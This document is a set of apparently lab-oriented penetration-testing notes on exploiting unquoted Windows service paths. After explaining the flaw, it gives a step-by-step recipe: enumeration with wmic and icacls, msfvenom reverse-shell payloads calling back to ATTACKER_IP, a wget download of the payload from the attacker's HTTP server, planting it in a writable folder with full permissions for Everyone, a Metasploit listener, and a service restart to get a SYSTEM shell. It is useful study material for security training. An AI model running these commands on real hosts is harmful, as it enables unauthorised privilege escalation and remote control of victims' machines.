Unquoted Service Path is a common Windows privilege escalation vulnerability that ***occurs when a Windows service executable path is not enclosed in quotation marks and contains spaces***.

Without quotation marks, ***Windows interprets the space character as `break` character rather than a space*** and assumes the executable path is everything up to that breakpoint.
#### Requirements 
If SYSTEM doesn't launch the service, it would only be a good vector for horizontal privilege escalation and not a vertical escalation.

You also ***need*** to have ***write permissions*** to one of the folders within the service's executable path to inject your own malicious executable into the file path.

**Proper Quotation**
```
sc qc "vncserver"
```

**Without Proper Quotation"
```
sc qc "disk sorted enterprise"
```

#### Finding Unquoted Service Paths
```
wmic service get name,pathname,displayname,startmode,startname | findstr /i auto | findstr /i /v "C:\Windows\System32" | findstr /i /v """
```
- `/v "C:\Windows\System32":` Excludes results containing `C:\Windows\System32`
- `/v "":` excludes results containing double quotes
- `auto:` Typically, Windows ***services can't be restarted by a low-privileged user*** that is why you need to ***look for services with a `startmode` of `AUTO_START`***.

When SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorted Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

| Command                                              | Argument 1                 | Argument 2                 |
| ---------------------------------------------------- | -------------------------- | -------------------------- |
| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |
When a Windows service has an unquoted path with spaces, the system misinterprets the path, breaking it into parts and searching for executables in order. For e.g.
- First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
- If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
- Finally `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`

If earlier paths don't exist, it keeps searching. Attackers can ***place a malicious executable (e.g., `Disk.exe`) in a writable location like `C:\MyPrograms`***, forcing the service to run it. Normally, `C:\Program Files` isn't writable.
```
icacls C:\MyPrograms
```
- `BUILTIN\\Users:` If they have `AD` and `WD` privileges, it allows the user to create subdirectories and files.

	**Naming the Payload**
	1. The binary path of the Service executable `C:\MyPrograms\Process Monitor\Daily Processes\processmonitor.exe`. 
	2. Check the `write permissions` on the folders. (In this case `Process Monitor` has write permissions)
	3. So, the name of the payload should be `Daily.exe` because it is directly underneath the `Process Monitor` directory which is writable.

**Create a Payload**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

# or 

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$kaliIPAddress LPORT=4444 -f exe -o Example.exe
```

**Transfer the Payload**
```
# Attacker
python3 -m http.server
nc -nvlp 4444

# Victim
wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
```

**Replace the Service Executable with our Payload and Grant Full Permission to Everyone**
```
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

**Start the Listener**
```
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost $kaliIPAddress; set lport 4444; exploit"
```

**Restart the Service**
```
sc stop "disk sorter enterprise" 
sc start "disk sorter enterprise"
```
Note: You can also restart the Host, if the service has `auto_start`.